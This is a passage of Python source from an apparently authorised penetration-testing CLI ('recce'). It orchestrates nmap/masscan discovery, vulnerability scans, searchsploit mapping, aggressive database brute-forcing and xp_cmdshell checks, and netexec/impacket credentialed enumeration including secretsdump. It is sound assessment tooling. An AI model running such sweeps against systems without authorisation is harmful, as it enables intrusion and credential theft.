    fast_mode = getattr(args, "fast", False) or profile.scanner == "masscan"
    port_map = None
    disc_reasons: dict[str, str] = {}   # ip -> real discovery reply reason (proof of up)
    if fast_mode:
        print("[*] Fast mode: network-wide masscan sweep ...")
        sweep_xml = os.path.join(paths["raw"], "masscan_sweep.xml")
        port_map = scanner.masscan_sweep(hosts, sweep_xml, profile)
        if port_map:
            if getattr(args, "targets_up", False):
                # Authoritative list: enumerate EVERY provided host, not just the ones
                # masscan found open, so a silent host is still seeded (never "no hosts").
                live_ips = sorted(hosts, key=_ip_key)
                print(f"[+] masscan found {len(port_map)} host(s) with open ports; "
                      f"enumerating all {len(live_ips)} authoritative target(s).")
            else:
                live_ips = sorted(port_map, key=_ip_key)
                print(f"[+] masscan found {len(live_ips)} host(s) with open ports.")
        else:
            print("[!] masscan unavailable/empty; falling back to nmap.")
            port_map, fast_mode = None, False

    if not fast_mode:
        if profile.ping_discovery:
            with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as tf:
                tf.write("\n".join(hosts))
                targets_file = tf.name
            disc_xml = os.path.join(paths["raw"], "discovery.xml")
            print("[*] Discovery: host sweep ...")
            _, iss = scanner.discover_hosts(targets_file, disc_xml)
            if iss:
                _record_issues(store, paths, "(discovery)", [_mkissue(iss, "discovery")])
            disc_hosts = np.parse_nmap_xml(disc_xml)
            live_ips = [h.ip for h in disc_hosts]
            # Carry each responder's real status reason (echo-reply/syn-ack/arp-...)
            # into the enum phase so the stored host records HOW we know it's up.
            disc_reasons = {h.ip: (h.up_reason or "discovery")
                            for h in disc_hosts if h.up_reason not in ("", "user-set")}
            os.unlink(targets_file)
            print(f"[+] {len(live_ips)} of {len(hosts)} target(s) responded to discovery.")
            if not live_ips:
                # Zero responses almost always means the network blocks ping/probes,
                # not that nothing is there. Don't hand back an empty engagement -
                # fall back to -Pn (scan every target as up) automatically.
                print("\n" + "!" * 64)
                print("[!] 0 hosts answered host discovery - the network is likely "
                      "blocking ping/probes.")
                print("    Falling back to -Pn (scanning all targets as up) so you "
                      "don't miss firewalled hosts.")
                print(f"    Per-host cap {profile.host_timeout}m + fail-fast keep it "
                      "moving; for a large scope, --fast (masscan) sweeps in seconds.")
                print("!" * 64)
                # Behave exactly like an explicit -Pn from here: assume-up + skip the
                # per-dead-IP verify re-scan (the UDP fallback still fires, gated on
                # assume_up). Leaving ping_discovery True would re-scan every dead IP
                # on precisely the large, discovery-blocked scope we want to move fast.
                profile.assume_up = True
                profile.ping_discovery = False
                live_ips = hosts
            elif len(live_ips) < len(hosts):
                # Partial sweep: DON'T drop the non-responders on faith - a live host
                # behind a default-drop firewall blocks ping yet still answers a port
                # scan. Re-probe them; promote any that show an open port.
                responded = set(live_ips)
                missed = [ip for ip in hosts if ip not in responded]
                recovered, riss = _reconfirm_missed(missed, profile, paths)
                if riss:
                    _record_issues(store, paths, "(reconfirm)",
                                   [_mkissue(riss, "reconfirm")])
                if recovered:
                    live_ips = list(live_ips) + [ip for ip in missed if ip in recovered]
                    disc_reasons.update(recovered)
                    print(f"    [+] Reconfirm recovered {len(recovered)} host(s) that "
                          "blocked ping but answered a port scan.")
                still = len(hosts) - len(live_ips)
                if still:
                    print(f"    ({still} still didn't answer. If you expect more live "
                          "hosts, re-run with -Pn - some firewalls drop everything "
                          "unsolicited.)")
        else:
            live_ips = hosts
            print(f"[*] -Pn: skipping discovery, scanning all {len(hosts)} target(s) "
                  "as up.")
            print(f"    Each host is capped at {profile.host_timeout}m (--host-timeout) "
                  "and dead IPs are abandoned fast; --fast (masscan) is quickest on a "
                  "big scope.")
            if profile.udp_fallback:
                print("    A host still silent on TCP gets a UDP liveness ping, so a "
                      "firewalled-but-alive box is confirmed up, not ruled dead "
                      "(--no-udp-fallback to skip).")

    if getattr(args, "resume", False):
        done = store.scanned_ips()
        live_ips = [ip for ip in live_ips if ip not in done]
        print(f"[+] Resume: {len(live_ips)} host(s) remaining.")
    # Authoritative list: seed each responder's up-reason so a provided host is shown
    # up (labelled 'target-list') even before its scan finishes.
    if getattr(args, "targets_up", False):
        for ip in live_ips:
            disc_reasons.setdefault(ip, "target-list")
    return subnet_map, live_ips, port_map, disc_reasons, hostname_map


def _phase_enum(store, paths, args, profile, subnet_map, live_ips, port_map,
                disc_reasons=None, hostname_map=None) -> None:
    creds = _creds_of(args)
    workers = max(1, args.workers)
    disc_reasons = disc_reasons or {}
    hostname_map = hostname_map or {}
    # --no-probes disables our active stdlib layer (banner grabs); the free passive
    # layers (servicefp mining + curated port map) still run.
    active_probe = not getattr(args, "no_probes", False)
    # Announce the port scope so a full sweep is verifiable - and loudly flag a PARTIAL
    # (top-N) one so it's never mistaken for a complete scan. Recorded for the report.
    scope_label, is_full = scanner.port_scope_label(profile)
    store.set_meta("port_scope", scope_label)
    if is_full:
        print(f"[*] Port scope: {scope_label} per host (full sweep).")
    else:
        print(f"[!] Port scope: {scope_label} per host - PARTIAL, NOT a full scan. "
              "Pass --all-ports (or --profile standard) for all 65535 ports.")
    print(f"[*] Enumerating {len(live_ips)} host(s) with {workers} worker(s) "
          f"(ports + services) ...")
    completed = 0
    refresher = _Refresher(args)
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_enum_worker, ip, profile, paths, creds, port_map,
                             subnet_map, active_probe, disc_reasons.get(ip, ""),
                             hostname_map.get(ip, "")): ip
                   for ip in live_ips}
        for fut in as_completed(futures):
            ip = futures[fut]
            try:
                host, issues = fut.result()
            except Exception as e:  # noqa: BLE001
                _record_issues(store, paths, ip,
                               [{"phase": "enum", "level": "error",
                                 "message": f"enum crashed: {e}"}])
                continue
            _record_issues(store, paths, ip, issues)
            if host is None:
                continue
            if not _persist_host(store, paths, ip, "enum", host, clear_step="enum"):
                continue   # one host's persist failure never aborts the rest
            completed += 1
            extra = f" - {', '.join(host.roles)}" if host.roles else ""
            print(f"    [{completed}/{len(live_ips)}] {ip}: "
                  f"{len(host.open_ports)} open port(s){extra}")
            refresher.tick(store, paths, args.title)


# --- phase 2b: vulnerability scanning (per open port) ---------------------------

def _merge_vuln_results(host: Host, parsed_list) -> None:
    """Fold vuln-phase results (vulns, accounts, port scripts) into a host."""
    port_index = {(p.protocol, p.portid): p for p in host.ports}
    for ph in parsed_list:
        if ph.ip != host.ip:
            continue
        vseen = {v.key for v in host.vulns}
        host.vulns.extend(v for v in ph.vulns if v.key not in vseen)
        aseen = {(a.source, a.kind, a.name, a.domain, a.rid) for a in host.accounts}
        for a in ph.accounts:
            if (a.source, a.kind, a.name, a.domain, a.rid) not in aseen:
                host.accounts.append(a)
        hs = {s.id for s in host.host_scripts}
        host.host_scripts.extend(s for s in ph.host_scripts if s.id not in hs)
        for np_ in ph.ports:
            op = port_index.get((np_.protocol, np_.portid))
            if op:
                seen = {s.id for s in op.scripts}
                op.scripts.extend(s for s in np_.scripts if s.id not in seen)
                op.product = op.product or np_.product
                op.version = op.version or np_.version


def _vuln_worker(host, portids, profile, paths, creds, aggressive, use_ss,
                 use_probes=True, fast=False):
    """Returns (host, issues)."""
    ip = host.ip
    issues: list[dict] = []
    if portids:
        vx = os.path.join(paths["raw"], f"{ip}_vuln.xml")
        _, iss = scanner.vuln_scan(ip, portids, vx, profile, creds=creds,
                                   aggressive=aggressive, fast=fast)
        if iss:
            issues.append(_mkissue(iss, "vuln-scan"))
        _merge_vuln_results(host, np.parse_nmap_xml(vx))
    if profile.udp_top:
        ux = os.path.join(paths["raw"], f"{ip}_udp.xml")
        _, iss = scanner.udp_scan(ip, ux, profile)
        if iss:
            issues.append(_mkissue(iss, "udp"))
        _merge_vuln_results(host, np.parse_nmap_xml(ux))
    pset = set(portids)
    for p in host.ports:
        if p.portid in pset:
            p.vuln_scanned = True
    ad.identify_roles(host)
    ad.parse_signing_and_ntlm(host)
    # Deep web enum runs BEFORE the CVE mapping so a product/version recovered from
    # a web fingerprint (Jenkins/Confluence/…) gets version->CVE matched too.
    if use_probes:
        from . import web
        web.scan_host(host, active=True)   # headers/TLS + exposures + fingerprint
    from . import vulndb
    vulndb.assess_host_inplace(host)   # offline version->CVE findings
    if use_ss:
        exploits.enrich_hosts([host])
    return host, issues


def _selected_hosts(hosts, args):
    """Filter stored hosts by IP / range / CIDR selection (targets/--host/--subnet)."""
    tokens = ((getattr(args, "targets", None) or [])
              + (getattr(args, "host", None) or [])
              + (getattr(args, "subnet", None) or []))
    match = ip_matcher(tokens)
    return [h for h in hosts if match(h.ip)]


def _vuln_targets(hosts, args):
    """Return [(host, [portids])] after target selection + --only/--unscanned."""
    only = [o.lower() for o in (getattr(args, "only", None) or [])]
    out = []
    for h in _selected_hosts(hosts, args):
        ports = h.open_ports
        if getattr(args, "unscanned", False):
            ports = [p for p in ports if not p.vuln_scanned]
        if only:
            ports = [p for p in ports
                     if any(k in (p.service or "").lower() or k == str(p.portid)
                            for k in only)]
        if ports:
            out.append((h, [p.portid for p in ports]))
    return out


def _phase_vulns(store, paths, args, profile) -> None:
    creds = _creds_of(args)
    aggressive = getattr(args, "aggressive", False)
    fast = getattr(args, "fast", False) and not aggressive
    use_ss = not getattr(args, "no_searchsploit", False) and exploits.available()
    use_probes = not getattr(args, "no_probes", False)
    if not getattr(args, "no_searchsploit", False) and not exploits.available():
        print("[!] searchsploit not found; skipping exploit mapping "
              "(apt install exploitdb).")
    if profile.offline:
        print("[*] Offline: vulners disabled; using local vuln scripts + searchsploit.")
    if aggressive:
        mode = "AGGRESSIVE (intrusive vuln category)"
    elif fast:
        mode = "FAST (top-signal detection scripts only)"
    else:
        mode = "safe (vuln+safe detection only)"
    print(f"[*] Vuln-scan mode: {mode}"
          f"{' + searchsploit' if use_ss else ''}"
          f"{' + web scan (headers/TLS + exposures)' if use_probes else ''}.")

    targets = _vuln_targets(store.all_hosts(), args)
    if not targets:
        print("[!] No open ports match the vuln-scan filters.")
        return
    workers = max(1, args.workers)
    total_ports = sum(len(p) for _, p in targets)
    total = len(targets)
    print(f"[*] Vuln-scanning {total} host(s) / {total_ports} port(s) "
          f"with {workers} worker(s) ...")
    completed = 0
    errs: list[tuple[str, str]] = []   # (ip, message) for a loud end-of-phase summary
    start = time.monotonic()
    refresher = _Refresher(args)
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_vuln_worker, h, ports, profile, paths, creds,
                             aggressive, use_ss, use_probes, fast): h.ip
                   for h, ports in targets}
        for fut in as_completed(futures):
            ip = futures[fut]
            try:
                host, issues = fut.result()
            except Exception as e:  # noqa: BLE001
                _record_issues(store, paths, ip,
                               [{"phase": "vuln-scan", "level": "error",
                                 "message": f"vuln-scan crashed: {e}"}])
                completed += 1
                errs.append((ip, f"crashed: {e}"))
                print(f"    [{completed}/{total}] {ip}: FAILED (crashed)"
                      f"{_progress(completed, total, start)}")
                continue
            _record_issues(store, paths, ip, issues)
            errs.extend((ip, i["message"]) for i in issues
                        if i.get("level") == "error")
            if not _persist_host(store, paths, ip, "vuln-scan", host, clear_step="vuln"):
                completed += 1
                continue
            completed += 1
            bits = []
            if host.vulns:
                bits.append(f"{len(host.vulns)} finding(s)")
            if host.exploits:
                bits.append(f"{len(host.exploits)} exploit(s)")
            b = f" [{', '.join(bits)}]" if bits else ""
            print(f"    [{completed}/{total}] {ip}: vuln-scanned{b}"
                  f"{_progress(completed, total, start)}")
            refresher.tick(store, paths, args.title)
    _summarize_failures("vuln-scan", errs, total)


# --- phase: database enumeration / vuln scan ------------------------------------

def _db_worker(host, portids, profile, paths, creds, aggressive, use_ss):
    """Returns (host, issues)."""
    from . import db as dbmod
    issues: list[dict] = []
    vx = os.path.join(paths["raw"], f"{host.ip}_db.xml")
    _, iss = scanner.nse_scan(host.ip, portids, vx, profile,
                              dbmod.script_selection(aggressive), creds=creds)
    if iss:
        issues.append(_mkissue(iss, "db"))
    _merge_vuln_results(host, np.parse_nmap_xml(vx))
    pset = set(portids)
    for p in host.ports:
        if p.portid in pset:
            p.vuln_scanned = True
    host.db_scanned = True
    if use_ss:
        exploits.enrich_hosts([host])
    return host, issues


def _phase_db(store, paths, args, profile) -> None:
    from . import db as dbmod
    creds = _creds_of(args)
    aggressive = getattr(args, "aggressive", False)
    use_ss = not getattr(args, "no_searchsploit", False) and exploits.available()
    targets = [(h, [p.portid for p in dbmod.db_ports(h)])
               for h in _selected_hosts(store.all_hosts(), args)]
    targets = [(h, ports) for h, ports in targets if ports]
    if not targets:
        print("[!] No database services found in scope.")
        return
    mode = "AGGRESSIVE (brute/xp_cmdshell)" if aggressive else "safe (info + empty-pw)"
    print(f"[*] DB-scanning {len(targets)} host(s) [{mode}] ...")
    refresher = _Refresher(args)
    completed = 0
    with ThreadPoolExecutor(max_workers=max(1, args.workers)) as ex:
        futures = {ex.submit(_db_worker, h, ports, profile, paths, creds,
                             aggressive, use_ss): h.ip for h, ports in targets}
        for fut in as_completed(futures):
            ip = futures[fut]
            try:
                host, issues = fut.result()
            except Exception as e:  # noqa: BLE001
                _record_issues(store, paths, ip,
                               [{"phase": "db", "level": "error",
                                 "message": f"db-scan crashed: {e}"}])
                continue
            _record_issues(store, paths, ip, issues)
            if not _persist_host(store, paths, ip, "db", host, clear_step="db"):
                continue
            completed += 1
            print(f"    [{completed}/{len(targets)}] {ip}: db-scanned")
            refresher.tick(store, paths, args.title)


# --- phase: privilege-escalation --------------------------------------------------

def _privesc_worker(host, profile, paths, creds, aggressive):
    """Returns (host, issues)."""
    from . import privesc as pe
    issues: list[dict] = []
    ports = [p.portid for p in host.open_ports
             if p.portid in (139, 445, 3389, 135) or "http" in (p.service or "")]
    if ports:
        vx = os.path.join(paths["raw"], f"{host.ip}_privesc.xml")
        _, iss = scanner.nse_scan(host.ip, ports, vx, profile,
                                  pe.nse_scripts(aggressive), creds=creds)
        if iss:
            issues.append(_mkissue(iss, "privesc"))
        _merge_vuln_results(host, np.parse_nmap_xml(vx))
        ad.identify_roles(host)
        ad.parse_signing_and_ntlm(host)
    host.privesc_checked = True          # the phase considered this host (mirrors _db_worker)
    return host, issues


def _phase_privesc(store, paths, args, profile) -> None:
    creds = _creds_of(args)
    aggressive = getattr(args, "aggressive", False)
    targets = _selected_hosts(store.all_hosts(), args)
    if not targets:
        print("[!] No hosts in scope.")
        return
    print(f"[*] Priv-esc checks on {len(targets)} host(s) "
          f"[{'aggressive' if aggressive else 'safe'} NSE] ...")
    refresher = _Refresher(args)
    completed = 0
    with ThreadPoolExecutor(max_workers=max(1, args.workers)) as ex:
        futures = {ex.submit(_privesc_worker, h, profile, paths, creds,
                             aggressive): h.ip for h in targets}
        for fut in as_completed(futures):
            ip = futures[fut]
            try:
                host, issues = fut.result()
            except Exception as e:  # noqa: BLE001
                _record_issues(store, paths, ip,
                               [{"phase": "privesc", "level": "error",
                                 "message": f"privesc crashed: {e}"}])
                continue
            _record_issues(store, paths, ip, issues)
            # clear_step clears any stale manual privesc override as part of the single
            # persist (host.privesc_checked was set in the worker) - no second pass.
            if not _persist_host(store, paths, ip, "privesc", host, clear_step="privesc"):
                continue
            completed += 1
            refresher.tick(store, paths, args.title)


# --- phase: credentialed enumeration (netexec / impacket / ssh) ------------------

def _ssh_creds_of(args) -> dict | None:
    user = getattr(args, "ssh_user", None)
    if not user:
        return None
    return {"username": user, "password": getattr(args, "ssh_pass", None),
            "key": getattr(args, "ssh_key", None)}


def _credenum_worker(host, creds, ssh_creds, aggressive, admin_creds=None):
    """Returns (host, issues, auth)."""
    from . import credenum
    issues, auth = credenum.enrich_host(host, creds, ssh_creds, aggressive=aggressive,
                                        admin_creds=admin_creds)
    return host, issues, auth


def _auth_cell(st: dict | None) -> str:
    """Format one account's per-host auth outcome for the summary table. A cell
    is only recorded when the tool actually ran, so an unrecorded/absent cell
    shows '-' (never FAIL) - a missing tool is not an auth failure."""
    if not st or not st.get("tried"):
        return "-"
    if st.get("error"):
        return "ERR"          # tool ran but errored (unreachable/timeout)
    if not st.get("auth"):
        return "FAIL"         # credentials rejected
    return "OK (admin)" if st.get("admin") else "OK"


def _print_auth_table(auth_rows: list) -> None:
    """Per-host authentication success/fail table. Only shows the columns that
    were actually attempted; flags rejected credentials loudly at the end."""
    if not auth_rows:
        return
    cols = [("user", "USER ACCT"), ("admin", "PRIV ACCT"), ("ssh", "SSH")]
    used = [(k, hd) for k, hd in cols if any(a.get(k) for _, a in auth_rows)]
    if not used:
        return
    print("\n[*] Authentication summary (per host):")
    header = f"      {'HOST':<16}" + "".join(f"{hd:<13}" for _, hd in used)
    print(header)
    print("      " + "-" * (len(header) - 6))
    fails = errs = 0
    for ip, a in sorted(auth_rows, key=lambda r: _ip_key(r[0])):
        cells = ""
        for k, _ in used:
            val = _auth_cell(a.get(k))
            fails += val == "FAIL"
            errs += val == "ERR"
            cells += f"{val:<13}"
        print(f"      {ip:<16}{cells}")
    if fails:
        print(f"[!] {fails} credential(s) were REJECTED (FAIL) - check the "
              "username/password/domain for those rows.")
    if errs:
        print(f"[!] {errs} attempt(s) ERRORED (ERR) - host unreachable, timed "
              "out, or the tool failed; not necessarily a credential problem.")


def _phase_credenum(store, paths, args) -> None:
    from . import credenum
    creds = _creds_of(args)
    admin_creds = _admin_creds_of(args)
    ssh_creds = _ssh_creds_of(args)
    aggressive = getattr(args, "aggressive", False)
    if not creds and not ssh_creds and not admin_creds:
        print("\n" + "!" * 64)
        print("[x] credenum needs credentials but none were given.")
        print("    Provide --username/--password (+--domain) for SMB/AD, and/or "
              "--ssh-user for Linux hosts.")
        print("!" * 64)
        return
    tools = credenum.available_tools()
    have = [k for k, v in tools.items() if v]
    print(f"[*] Credentialed enum tools present: {', '.join(have) or 'NONE'}.")
    if not have:
        print("\n" + "!" * 64)
        print("[x] No credentialed-enum tools found (netexec/impacket/ssh).")
        print("    Install netexec + impacket, or ensure ssh is on PATH, then re-run.")
        print("!" * 64)
        return
    # SMB/AD creds given but no SMB tool -> the SMB/AD half silently does nothing.
    # Say so explicitly (consistent with cmd_smb/cmd_mssql) rather than finishing
    # with a success message and zero accounts.
    if (creds or admin_creds) and not tools.get("netexec"):
        print("[!] netexec/impacket not installed - SMB/AD credentialed enum "
              "(accounts, shares, secretsdump) will be SKIPPED. Install netexec + "
              "impacket for the full credentialed pass; only the tools listed above run.")
    targets = _selected_hosts(store.all_hosts(), args)
    if not targets:
        print("[!] No hosts in scope.")
        return
    accts = []
    if creds:
        accts.append(f"user '{creds['username']}'")
    if admin_creds:
        accts.append(f"privileged '{admin_creds['username']}' (admin checks + secretsdump)")
    mode = (" with " + " + ".join(accts)) if accts else ""
    if aggressive and not admin_creds:
        mode += " + secretsdump (aggressive)"
    total = len(targets)
    print(f"[*] Credentialed enum on {total} host(s){mode} ...")
    refresher = _Refresher(args)
    completed = 0
    start = time.monotonic()
    errs: list[tuple[str, str]] = []
    auth_rows: list[tuple[str, dict]] = []   # (ip, auth) for the success/fail table
    with ThreadPoolExecutor(max_workers=max(1, args.workers)) as ex:
        futures = {ex.submit(_credenum_worker, h, creds, ssh_creds, aggressive,
                             admin_creds): h.ip
                   for h in targets}
        for fut in as_completed(futures):
            ip = futures[fut]
            try:
                host, issues, auth = fut.result()
            except Exception as e:  # noqa: BLE001
                _record_issues(store, paths, ip,
                               [{"phase": "credenum", "level": "error",
                                 "message": f"credenum crashed: {e}"}])
                completed += 1
                errs.append((ip, f"crashed: {e}"))
                print(f"    [{completed}/{total}] {ip}: FAILED (crashed)"
                      f"{_progress(completed, total, start)}")
                continue
            _record_issues(store, paths, ip, issues)
            errs.extend((ip, i["message"]) for i in issues
                        if i.get("level") == "error")
            if auth:
                auth_rows.append((ip, auth))
            if not _persist_host(store, paths, ip, "credenum", host):
                completed += 1
                continue
            completed += 1
            n_acct = sum(1 for a in host.accounts
                         if a.source in ("netexec", "impacket", "secretsdump"))
            print(f"    [{completed}/{total}] {ip}: cred-enum done"
                  + (f" ({n_acct} account/loot rows)" if n_acct else "")
                  + _progress(completed, total, start))
            refresher.tick(store, paths, args.title)
    _print_auth_table(auth_rows)
    _summarize_failures("credenum", errs, total)


def _setup_scan(args, need_targets=True):
    """Shared setup: profile, env check, store. Returns (profile, paths, store)."""
    # deepcopy: PROFILES holds shared module-level singletons; overriding a live one
    # would leak flags (--all-ports, --min-rate, a downgraded scanner) into later runs
    # in the same process (tests, library reuse).
    profile = copy.deepcopy(scanner.PROFILES[args.profile])
    _apply_profile_overrides(profile, args)
    try:
        for w in scanner.check_environment(profile):
            print(f"[!] {w}")
    except scanner.ScannerError as e:
        print(f"[x] {e}")
        return None, None, None
    try:
        paths = _open_paths(args.output_dir)
    except OSError as e:
        print(f"[x] Cannot use output dir '{args.output_dir}': {e}")
        return None, None, None
    try:
        store = Store(paths["db"])
    except StoreError as e:
        print(f"[x] {e}")
        return None, None, None
    _import_excel_tracking(store, paths)
    return profile, paths, store


def cmd_enum(args: argparse.Namespace) -> int:
    print(BANNER)
    profile, paths, store = _setup_scan(args)
    if store is None:
        return 1
    store.set_meta("engagement", args.title)
    subnet_map, live_ips, port_map, disc_reasons, hostname_map = _discover(
        args, profile, store, paths)
    if subnet_map is None:   # _discover already printed the specific reason
        store.close()
        return 1
    if getattr(args, "targets_up", False):
        seeded = _seed_targets(store, live_ips, subnet_map, hostname_map)
        print(f"[+] Authoritative list: pre-seeded {seeded} host(s) - every target is "
              "in the report even if its scan times out or fails.")
    try:
        _phase_enum(store, paths, args, profile, subnet_map, live_ips, port_map,
                    disc_reasons, hostname_map)
        if args.ldap_enum or args.ldap_anon:
            _run_ldap_enum(store, args)
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving results collected so far ...")
    finally:
        _final_report(store, paths, args.title)
        store.close()
    print(f"\n[+] Enumeration done -> {paths['xlsx']}")
    print(f"    Next:  recce vulns -o {args.output_dir}     "
          "# vuln-scan the open ports it found")
    print(f"    or:    recce services -o {args.output_dir}  "
          "# the exact per-service enum command for each open port")
    return 0


def cmd_vulns(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first.")
        return 1
    profile, paths, store = _setup_scan(args)
    if store is None:
        return 1
    title = store.get_meta("engagement") or args.title
    try:
        _phase_vulns(store, paths, args, profile)
        if args.ldap_enum or args.ldap_anon:
            _run_ldap_enum(store, args)
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving results collected so far ...")
    finally:
        _final_report(store, paths, title)
        store.close()
    print("\n[+] Vuln scan done -> open the Vulnerabilities / Exploitation tabs.")
    print(f"    Next:  recce status -o {args.output_dir}      # what's left, and the "
          "suggested next step")
    return 0


def cmd_scan(args: argparse.Namespace) -> int:
    """Convenience: run enum then vulns in one shot."""
    print(BANNER)
    profile, paths, store = _setup_scan(args)
    if store is None:
        return 1
    store.set_meta("engagement", args.title)
    subnet_map, live_ips, port_map, disc_reasons, hostname_map = _discover(
        args, profile, store, paths)
    if subnet_map is None:   # _discover already printed the specific reason
        store.close()
        return 1
    if getattr(args, "targets_up", False):
        seeded = _seed_targets(store, live_ips, subnet_map, hostname_map)
        print(f"[+] Authoritative list: pre-seeded {seeded} host(s) - every target is "
              "in the report even if its scan times out or fails.")
    try:
        _phase_enum(store, paths, args, profile, subnet_map, live_ips, port_map,
                    disc_reasons, hostname_map)
        _phase_vulns(store, paths, args, profile)
        if args.ldap_enum or args.ldap_anon:
            _run_ldap_enum(store, args)
    except KeyboardInterrupt:
        print("\n[!] Interrupted - saving results collected so far ...")
    finally:
        _final_report(store, paths, args.title)
        store.close()
    if getattr(args, "deep", False):
        # One kickoff: continue straight into the full credential-free deep sweep over
        # everything enum just discovered (each module self-skips where nothing matches).
        print("\n[*] --deep: running the credential-free deep sweep across all "
              "discovered hosts ...")
        return _run_sweep(args, authenticated=False)
    print("\n[+] Done.")
    return 0


def _sweep_defaults(args: argparse.Namespace) -> None:
    """Fill in every attribute the deep-module handlers read that the `sweep` parser
    doesn't define, so each runs its credential-free path without an AttributeError.
    Anything the user *did* pass (creds, --no-probe) is left untouched."""
    defaults = {
        "no_probe": False, "no_run": True, "prove_write": False, "no_active": False,
        "cookie": None, "header": None, "creds": False, "crawl": False,
        "sqli_time": False, "username": None, "password": None, "domain": None,
        "dc_ip": None, "local_auth": False, "lhost": "<LHOST>", "data": False,
        "exec_cmd": None, "method": None, "link_depth": 1, "no_links": False,
        "perms": False, "relay": None,
    }
    for k, v in defaults.items():
        if not hasattr(args, k):
            setattr(args, k, v)


# The credential-free deep pass: recce's own stdlib probes. Order is foothold-ish -
# web + protocol posture first, then the heavier service dives. Each no-ops cleanly
# when the datastore has no matching host.
_UNAUTH_SWEEP = [
    ("web", "cmd_web"), ("smb", "cmd_smb"), ("ftp", "cmd_ftp"), ("ldap", "cmd_ldap"),
    ("snmp", "cmd_snmp"), ("mongodb", "cmd_mongodb"), ("redis", "cmd_redis"),
    ("elasticsearch", "cmd_elasticsearch"), ("rsync", "cmd_rsync"),
    ("nfs", "cmd_nfs"), ("kerberos", "cmd_kerberos"), ("docker", "cmd_docker"),
    ("kubernetes", "cmd_kubernetes"), ("mssql", "cmd_mssql"),
]
# The authenticated pass: the modules that DO something new once you have creds -
# the netexec/impacket phase plus the authenticated facets of the deep modules. The
# unauth-only modules (web/snmp/mongodb/redis/elasticsearch/rsync/nfs/kerberos/docker/
# k8s) are intentionally absent; you run `sweep` for those. Each handler here keys its
# authenticated path off args.username.
_AUTH_SWEEP = [
    ("credenum", "cmd_credenum"), ("ldap", "cmd_ldap"), ("smb", "cmd_smb"),
    ("mssql", "cmd_mssql"), ("ftp", "cmd_ftp"),
]


def _run_sweep(args: argparse.Namespace, *, authenticated: bool) -> int:
    """Shared engine for `sweep` (unauth) and `credsweep` (auth). Runs each applicable
    module with the workbook rebuild deferred to a single pass at the end; a module
    that errors is isolated so one failure doesn't abort the rest."""
    global _DEFER_REPORTS
    print(BANNER)
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum`/`import` first.")
        return 1
    _sweep_defaults(args)

    if authenticated:
        if not getattr(args, "username", None):
            print("[x] credsweep is the authenticated pass and needs credentials: "
                  "-u USER -p PASS [-d DOMAIN]. For the credential-free modules, "
                  "run `recce sweep`.")
            return 1
        # The whole point of credsweep is to run the authenticated tooling, so the
        # nxc/impacket matrix must actually execute (handlers gate it on `not no_run`).
        args.no_run = False
        table, kind, tag = _AUTH_SWEEP, "credentialed", "CREDSWEEP"
    else:
        # `sweep` is strictly unauthenticated: drop any creds so a stray -u can't fire
        # a credentialed action as an invisible side-effect of this command.
        if getattr(args, "username", None):
            print("[!] `sweep` is the unauthenticated pass - ignoring the credentials "
                  "you passed. Run `recce credsweep -u ... -p ...` for the "
                  "authenticated modules.")
            args.username = args.password = None
            args.ldap_enum = args.ldap_anon = False
        table, kind, tag = _UNAUTH_SWEEP, "credential-free", "SWEEP"

    modules = [(n, globals()[fn]) for n, fn in table]
    skip = {s.strip().lower() for s in (getattr(args, "skip", None) or [])}
    only = {s.strip().lower() for s in (getattr(args, "only_modules", None) or [])}
    if only:
        modules = [(n, h) for n, h in modules if n in only]
    if skip:
        modules = [(n, h) for n, h in modules if n not in skip]

    # The NSE vuln scan is an unauthenticated concept - only offered on `sweep`.
    run_vulns = getattr(args, "vulns", False) and not authenticated
    ran, failed = [], []
    _DEFER_REPORTS = True
    try:
        if run_vulns:
            print("\n" + "=" * 64 + "\n[SWEEP] vulns (nmap NSE)\n" + "=" * 64)
            try:
                cmd_vulns(args)
                ran.append("vulns")
            except Exception as e:  # noqa: BLE001 - one module must not abort the sweep
                failed.append(("vulns", e))
                print(f"[!] vulns failed: {type(e).__name__}: {e}")
        for name, handler in modules:
            print("\n" + "=" * 64 + f"\n[{tag}] {name}\n" + "=" * 64)
            try:
                handler(args)
                ran.append(name)
            except Exception as e:  # noqa: BLE001
                failed.append((name, e))
                print(f"[!] {name} failed: {type(e).__name__}: {e}")
    finally:
        _DEFER_REPORTS = False

    # Single, authoritative report rebuild from everything the modules folded in.
    store = _open_store(paths["db"])
    if store is not None:
        _import_excel_tracking(store, paths)
        title = store.get_meta("engagement") or args.title
        _generate_reports(store, paths, title)
        store.close()

    print("\n" + "=" * 64)
    print(f"[+] {kind.capitalize()} sweep complete: ran {len(ran)} module(s) "
          f"({', '.join(ran) or 'none'}).")
    if failed:
        print(f"[!] {len(failed)} module(s) errored: "
              f"{', '.join(n for n, _ in failed)} - re-run individually to debug.")
    nxt = ("`recce credsweep -u ... -p ...` (once you have creds), then `recce prove`"
           if not authenticated else "`recce prove` then `recce attackpath`")
    print(f"    Reports rebuilt. Next: {nxt}.")
    return 1 if failed else 0


def cmd_sweep(args: argparse.Namespace) -> int:
    """Unauthenticated deep pass: run every applicable credential-free module
    (web/smb/ftp/ldap/snmp/mongodb/redis/elasticsearch/rsync/nfs/kerberos/docker/
    kubernetes/mssql) in one shot after `enum`, instead of typing each by hand. Each
    self-skips when there's no matching service;
    the workbook is rebuilt once at the end. For the authenticated modules use
    `credsweep`."""
    return _run_sweep(args, authenticated=False)


def cmd_credsweep(args: argparse.Namespace) -> int:
    """Authenticated deep pass (needs -u/-p): run the credentialed modules in one shot
    - the netexec/impacket phase (`credenum`) plus the authenticated facets of
    `ldap` (kerberoast/AS-REP/accounts), `smb` (credentialed shares + write proof),
    `mssql` (access/privilege matrix) and `ftp`. Assumes you already ran `sweep` for
    the credential-free surface."""
    return _run_sweep(args, authenticated=True)


def cmd_db(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first.")
        return 1
    profile, paths, store = _setup_scan(args)
    if store is None:
        return 1
    title = store.get_meta("engagement") or args.title
    try:
